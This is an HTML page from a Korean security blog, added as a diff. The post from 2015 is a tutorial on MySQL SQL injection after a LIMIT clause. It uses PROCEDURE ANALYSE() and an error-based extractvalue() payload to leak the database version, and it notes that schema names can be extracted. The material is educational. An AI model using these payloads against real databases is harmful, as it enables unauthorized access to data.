@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Tempuss Blog" /></head>
+<style>@import url(/public/css/syntax/monokai.css);</style>
+  <title>Tempuss Blog</title>
+  <!-- <link href="/public/css/bootstrap.min.css" rel="stylesheet"> -->
+
+  <link href="/public/css/style.css" rel="stylesheet">
+  <body>
+  	<div class="container"> 
+		<div class="sidebar">
+			<div class="sidebar-item sidebar-header">
+	<div class='sidebar-brand'>
+		<a href="/about/">Tempuss Blog</a>
+	</div>
+	<p class="lead">보안하는 개발자</p></div>
+
+<div class="sidebar-item sidebar-nav">
+	<ul class="nav">
+      <li class="nav-title">Pages</li>
+	  <li>
+	  	<a class="nav-item" href="/">Articles</a>
+	  </li>
+	  
+	  
+	    
+	  
+	    
+	      
+	        <li>
+	        	<a class="nav-item" href="/about/">
+	            	About
+	            </a>
+	        </li>
+	      
+	    
+	  
+	    
+	      
+	    
+	  
+	    
+	  
+	    
+	  
+	</ul>
+</div>
+
+<div class="sidebar-item sidebar-nav">
+  	<ul class="nav">
+			<li class="nav-title">Categories</li>
+	    
+	    <li>
+	    	<a class="nav-item" href="/category/#Hacking">
+				<span class="name">Hacking</span>
+				<span class="badge">39</span>
+	    	</a>
+ 		</li>
+	    
+	    <li>
+	    	<a class="nav-item" href="/category/#Web">
+				<span class="name">Web</span>
+				<span class="badge">8</span>
+	    	</a>
+ 		</li>
+	    
+	    <li>
+	    	<a class="nav-item" href="/category/#BoB">
+				<span class="name">BoB</span>
+				<span class="badge">9</span>
+	    	</a>
+ 		</li>
+	    
+	    <li>
+	    	<a class="nav-item" href="/category/#Data-Engineering">
+				<span class="name">Data-Engineering</span>
+				<span class="badge">8</span>
+	    	</a>
+ 		</li>
+	    
+	  </nav>
+	</ul>
+</div>
+
+<div class="sidebar-item sidebar-footer">
+	<p>Powered by <a href="https://github.com/jekyll/jekyll">Jekyll</a></p>
+</div>
+		</div>
+		<div class="content">
+			<article class="post">
+	<header class="post-header">
+		<div class="post-title"> 
+			Procedure analyse()를 이용한 SQL Injection
+		</div>
+		<time class="post-date dt-published" datetime="2015-09-07T10:52:00+09:00" itemprop="datePublished">2015/09/07
+		</time>		
+	</header>
+
+	<div class="post-content">
+		<pre><code class="language-mysql"> [LIMIT {[offset,] row_count | row_count OFFSET offset}]
+    [PROCEDURE procedure_name(argument_list)]
+    [INTO OUTFILE 'file_name'
+        [CHARACTER SET charset_name]
+        export_options
+      | INTO DUMPFILE 'file_name'
+      | INTO var_name [, var_name]]
+    [FOR UPDATE | LOCK IN SHARE MODE]]
+
+</code></pre>
+
+<p>limit 절 뒤에 사용가능한 함수는 그리 많지 않습니다. 그중에서도 SQL Injection에 쓰이는것은</p>
+
+<p>procedure analyse()라는 함수입니다. 이 함수는 현재 실행중인 컬럼에 대한 정보를 사용가능하게 해줍니다.</p>
+
+<p>이 함수를 이용하면</p>
+
+<pre><code class="language-mysql">
+mysql&gt; select * from user where id='admin' limit 1 procedure analyse();
+
++--------------------+-----------+-----------+------------+------------+------------------+-------+-------------------------+------+------------------
+
+------+
+
+| Field_name         | Min_value | Max_value | Min_length | Max_length | Empties_or_zeros | Nulls | Avg_value_or_avg_length | Std  | Optimal_fieldtype
+
+      |
+
++--------------------+-----------+-----------+------------+------------+------------------+-------+-------------------------+------+------------------
+
+------+
+
+| user.user.id       | admin     | admin     |          5 |          5 |                0 |     0 | 5.0000                  | NULL | ENUM('admin') NOT
+
+ NULL |
+
+
+
+</code></pre>
+
+<p>좀 깨졌지만 이렇게 컬럼의 정보에 대해서 알 수 있다.</p>
+
+<p>이렇게 현재 컬럼의 테이블명과 기타 정보들이 노출됩니다.</p>
+
+<p>하지만 저 procedure analyse()함수 안에서도 다른 값을 뽑아낼 수 있습니다.</p>
+
+<p>그중에서 사용되는 함수는 다양하지만</p>
+
+<p>extractvalue()라는 함수가 있습니다.</p>
+
+<pre><code class="language-mysql">mysql&gt; SELECT * FROM user WHERE id='admin' limit 1 procedure analyse(extractvalue(1,concat(0x3a,version())),1);
+ERROR 1105 (HY000): XPATH syntax error: ':5.1.41-community'
+mysql&gt;
+</code></pre>
+
+<p>이렇게 하면 version을 뽑을 수 있습니다.</p>
+
+<p>그 외에도 information_schema에 접근하여 DB와 테이블명에 대해서도 뽑아 올 수 있습니다.</p>
+
+
+	</div>
+</article>
+		</div>
+	</div>
+  </body>
+</html>
